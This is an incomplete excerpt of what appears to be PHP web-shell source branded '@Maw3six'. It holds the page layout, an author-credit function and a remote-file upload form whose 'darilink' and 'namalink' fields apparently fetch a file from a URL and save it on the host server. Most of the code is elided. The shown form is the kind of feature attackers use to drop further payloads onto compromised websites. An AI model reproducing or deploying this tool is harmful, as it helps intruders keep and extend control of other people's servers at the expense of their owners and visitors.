...
<body bgcolor="#1f1f1f" text="#ffffff">
	<center>
		<font face="Bungee" size="5">@Maw3six</font>
	</center>
	<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
			<td>
				...
				function author() {
					echo "<center><br>@Maw3six - 2025</center>";
					exit();
				}
				...
				<input type="text" name="darilink" class="up" placeholder="https://t.me/maw3six">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
				</form>';
				echo "</table><br>";
